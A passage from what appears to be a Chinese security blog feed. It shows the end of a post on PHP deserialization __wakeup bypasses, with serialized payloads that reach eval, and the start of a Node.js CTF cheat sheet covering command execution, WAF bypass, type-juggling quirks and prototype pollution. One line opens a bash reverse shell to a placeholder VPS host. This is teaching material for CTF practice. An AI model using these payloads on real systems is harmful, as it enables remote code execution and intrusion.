class="hljs apache"><span class="hljs-attribute">trick</span>=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>成功拿到phpinfo信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20230915144536182.png" alt="image-20230915144536182" /></p><h2 id="fast-destruct绕过wakeup">2、fast destruct绕过wakeup</h2><h3 id="构造链式关系">2.1、构造链式关系</h3><p>在看fast destruct之前，我们先来看一下php的wakeup与destruct的链式关系。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$attr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A wakeup &quot;</span>;    <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$attr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;B wakeup &quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;B destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C wakeup &quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-variable">$v1</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$v2</span> = <span class="hljs-keyword">new</span> B();<br><span class="hljs-variable">$v3</span> = <span class="hljs-keyword">new</span> C();<br><br><span class="hljs-variable">$v2</span>-&gt;attr = <span class="hljs-variable">$v3</span>;<br><span class="hljs-variable">$v1</span>-&gt;attr = <span class="hljs-variable">$v2</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很显然可以看到这里的链式关系是 A -&gt; B -&gt; C（-&gt;代表拥有）</p><h3 id="正常反序列化">2.2、正常反序列化</h3><p>输出结果如下，可以发现php类释放时，先调用自身的destruct方法，才释放属性。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">A <span class="hljs-built_in">destruct</span> B <span class="hljs-built_in">destruct</span> C <span class="hljs-built_in">destruct</span><br></code></pre></td></tr></table></figure><p>那么我们现在尝试如下代码，看看在有wakeup的基础下会发生什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ser</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;C&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br>unserialize(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>输出结果如下，可以发现php类反序列化时会递归调用属性的wakeup。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">C wakeup <span class="hljs-selector-tag">B</span> wakeup <span class="hljs-selector-tag">A</span> wakeup <span class="hljs-selector-tag">A</span> destruct <span class="hljs-selector-tag">B</span> destruct C destruct<br></code></pre></td></tr></table></figure><h3 id="异常反序列化">2.3、异常反序列化</h3><p>在此基础上，我们引入新的姿势，PHP反序列化发生异常时，会直接调用destruct方法。</p><p>构造一个能够触发反序列化发生异常的语句，基于上述的代码来看有什么问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ser</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;C&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$ser</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;C&quot;:0:&#123;&#125;&#125;;1&#125;&#x27;</span>;<br>unserialize(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>输出结果如下，还是正常的结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C wakeup B wakeup A wakeup A destruct B destruct C destruct<br></code></pre></td></tr></table></figure><p>那该如何触发绕过<code>__wakeup</code>呢？</p><p>这里我们再补充一个姿势，感兴趣的师傅们可以通过调试验证。</p><ul><li>php反序列化时，递归为对象分配内存空间。然后才调用wakeup方法</li><li>对于同一个对象，即使发生异常，也是先调用wakeup再调用destruct</li></ul><p>为了更好地说明问题，我们将A的wakeup注释，再次尝试异常反序列化。</p><p>输出结果如下，可以发现先调用了A的destruct。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">A <span class="hljs-built_in">destruct</span> C wakeup B wakeup B <span class="hljs-built_in">destruct</span> C <span class="hljs-built_in">destruct</span><br></code></pre></td></tr></table></figure><h3 id="攻击方式总结">2.4、攻击方式总结</h3><p>假设此时C的一个非destruct类中存在危险函数（但是涉及到的属性会被C的wakeup给清除）。</p><p>如果可以构造以A的destruct为起点的POP链，那么我们就能够成功绕过C的wakeup，从而实现我们的攻击。</p><p>fast destruct的可利用模式总结：</p><ol type="1"><li>攻击起点为类A的__destruct魔术方法，终点为类C的非__destruct魔术方法</li><li>类A不存在wakeup方法</li><li>触发类A反序列化异常，从而引动POP链</li></ol><h2 id="c绕过">3、C绕过</h2><p>这个算是非常trick的一个点了。</p><p>将一个对象的O属性改为C，则可以绕过wakeup，但是这样无法传值，也只能利用__destruct来实现攻击。</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">2</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saferman</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bypass!!&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;catch!!&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;echo hello;&quot;</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们构造如下的payload即可实现绕过</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;C</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Saferman&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>在某些版本可以使用ArrayObject将需要的类封装起来从而实现在C绕过中为类赋值。但是攻击面还是很狭窄的。</p><p>如果有CTF需求想要学习的可以参考这道题：<a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">C绕过trick</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs安全特性总结</title>
    <link href="/2023/07/20/blog0030-node.js%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    <url>/2023/07/20/blog0030-node.js%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>node.js的相关安全问题之前在比赛中一直有遇到，一般都是现学现卖。</p><p>今天顺便也总结一下相关的payload。</p><h2 id="大小写绕过">大小写绕过</h2><p>toUpperCase()</p><p>字符<code>"ı"</code>经过处理后结果为 <code>"I"</code></p><p>字符<code>"ſ"</code> 经过处理后结果为<code>"S"</code></p><p>toLowerCase()</p><p>字符<code>"İ"</code>经过处理后变成<code>"i "</code></p><p>字符<code>"K"</code>经过处理后结果为<code>"k"</code></p><p>这个神奇的trick是p牛之前fuzz出来的，参考博客如下：</p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">node.js大小写转换函数fuzz</a></p><h2 id="危险函数">危险函数</h2><h3 id="命令执行">命令执行</h3><p>在node.js中，执行系统命令的代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;ls&#x27;</span>,[<span class="hljs-string">&#x27;/&#x27;</span>]).stdout.toString()<br><span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/&#123;vps ip&#125;/2333 0&gt;&amp;1\&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>绕过字符串匹配的waf</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)[<span class="hljs-string">&quot;exe&quot;</span>+<span class="hljs-string">&quot;cSync&quot;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="代码执行">代码执行</h3><p>node.js中也有相应的代码执行的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>除了eval之外，再介绍一个Function</p><p><code>Function</code> 是 JavaScript 中的一个内置对象和函数构造函数。它可以用来创建新的函数对象。</p><p>具体来说，通过 <code>new Function()</code> 或者直接将函数体作为字符串传递给 <code>Function</code> 构造函数，可以动态地创建一个函数。</p><p>函数参数是以字符串形式传递的，它们是函数在被调用时接收的值（也就是下面例子中的x，y）。函数体是一个字符串，表示函数的实际代码。</p><p>举个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> add = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(<span class="hljs-string">&#x27;num1&#x27;</span>, <span class="hljs-string">&#x27;num2&#x27;</span>, <span class="hljs-string">&#x27;return num1 + num2;&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出 8</span><br><br><span class="hljs-keyword">var</span> multiply = <span class="hljs-built_in">Function</span>(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;return x * y;&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(multiply(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// 输出 8</span><br></code></pre></td></tr></table></figure><h2 id="弱类型比较">弱类型比较</h2><p>这里其实就是js经典弱比较导致的一堆锅</p><ul><li>数字与纯数字字符串比较时，会将纯数字字符串转换成数字比较</li><li>[]与[]比较恒为False</li><li>数组之间比较只比较第一个元素的值</li><li>数组取第一个元素与字符串比较</li></ul><p>这个就纯属trick了，我觉得还是见到了再收集吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;1&#x27;</span>==<span class="hljs-number">1</span>)  <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;2&#x27;</span>&gt;<span class="hljs-number">1</span>)   <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log([]==[])  <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log(&#123;&#125;==&#123;&#125;)  <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log([<span class="hljs-number">2</span>,<span class="hljs-number">100</span>,<span class="hljs-number">2</span>]&gt;[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]) <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>还有一些特殊的比较</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">null</span>==<span class="hljs-literal">undefined</span>)  <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">null</span>===<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">NaN</span>==<span class="hljs-literal">NaN</span>)         <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="变量拼接">变量拼接</h2><p>这个也是非常trick了，主要是各种类型的拼接</p><p>比如数组+字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-number">5</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]);       <span class="hljs-comment">//56,3 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+<span class="hljs-number">6</span>);         <span class="hljs-comment">//56 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]);     <span class="hljs-comment">//56,6 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>]); <span class="hljs-comment">//56,6</span><br></code></pre></td></tr></table></figure><h2 id="md5绕过">MD5绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">md5(&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>&#125;+<span class="hljs-string">&quot;123&quot;</span>)==md5(&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;+<span class="hljs-string">&quot;123&quot;</span>)<br><span class="hljs-built_in">console</span>.log([<span class="hljs-number">1</span>]!==[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="url畸变">URL畸变</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span>&amp;query=<span class="hljs-string">&quot;password&quot;</span></span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><p>在node.js的HTTP处理框架中，等价</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><h2 id="原型链污染">原型链污染</h2><h3 id="原型链">原型链</h3><p>首先，我们需要明确什么是原型链，这涉及到javascript的一些底层实现。</p><p>以下是内容摘自官方文档：</p><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 <code>class</code> 的实现。即便是在 ES2015/ES6 中引入了 <code>class</code> 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。</p><p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（<strong>proto</strong>），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p><p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的实例。</p><p>尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。</p><p>我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Father</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.lastname = <span class="hljs-string">&quot;Donald&quot;</span>;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Trump&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Son</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Jack&quot;</span>;<br>&#125;<br><br>Son.prototype = <span class="hljs-keyword">new</span> Father();<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> Son();<br><br><span class="hljs-built_in">console</span>.log(son);<br><span class="hljs-built_in">console</span>.log(son.__proto__ === Son.prototype);<br><span class="hljs-built_in">console</span>.log(son.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(son.__proto__.__proto__.__proto__.__proto__)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;son.firstname&#125;</span>, <span class="hljs-subst">$&#123;son.lastname&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>从这个例子的输出，大概能够简单理解出原型链的一个概念。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">Father &#123; firstname: &#x27;Jack&#x27; &#125;<br>true<br>Father &#123; lastname: &#x27;Donald&#x27;, firstname: &#x27;Trump&#x27; &#125;<br>&#123;&#125;<br>[Object: null prototype] &#123;&#125;<br>null<br>Jack, Donald<br></code></pre></td></tr></table></figure><h3 id="污染利用">污染利用</h3><p>我们知道了存在原型链这个概念，那么怎么去利用呢。</p><p>我们再看下面一个例子，我们通过原型链导致对象中可以存在被利用的属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Father</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.lastname = <span class="hljs-string">&quot;Donald&quot;</span>;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Trump&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Son</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.firstname = <span class="hljs-string">&quot;Jack&quot;</span>;<br>&#125;<br><br>Son.prototype = <span class="hljs-keyword">new</span> Father();<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> Son();<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;son.firstname&#125;</span>, <span class="hljs-subst">$&#123;son.lastname&#125;</span>`</span>)<br><br>son.__proto__.lastname = <span class="hljs-string">&quot;kiki&quot;</span><br><br><span class="hljs-keyword">let</span> other_son = <span class="hljs-keyword">new</span> Son();<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;other_son.firstname&#125;</span>, <span class="hljs-subst">$&#123;other_son.lastname&#125;</span>`</span>)<br><br>son.__proto__.__proto__.__proto__.lastname = <span class="hljs-string">&quot;hacker!!!&quot;</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>.lastname)<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Jack, Donald<br>Jack, kiki<br>hacker!!!<br></code></pre></td></tr></table></figure><p>我们可以看到，如果能够利用原型链污染，我们可以直接向上追溯，从而修改控制链上对象的属性修改。</p><h3 id="mergecopy">merge/copy</h3><p>常见的原型链污染，发生在对象的嵌套copy/merge上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-comment">// console.log(&quot;key : &quot;, key)</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>当然，这里我们需要注意的一点是，merge中我们的处理对象是key，所以你的<code>__proto__</code>应该是键名而不是原型。</p><p>比如，如下例子中，我们可以看到原型链并没有污染。这是因为<code>__proto__</code>没有被当做key来进行处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> victim = &#123;&#125;<br><span class="hljs-keyword">let</span> hacker = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">__proto__</span>: &#123; <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> &#125; &#125;<br>copy(victim, hacker)<br><span class="hljs-built_in">console</span>.log(victim)<br><br>o3 = &#123;&#125;<br><span class="hljs-built_in">console</span>.log(o3.b)<br><br><span class="hljs-comment">// key :  a</span><br><span class="hljs-comment">// key :  b</span><br><span class="hljs-comment">// &#123; a: 1, b: 2 &#125;</span><br><span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>我们修改代码如下，即可就能成功实现原型链的污染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span 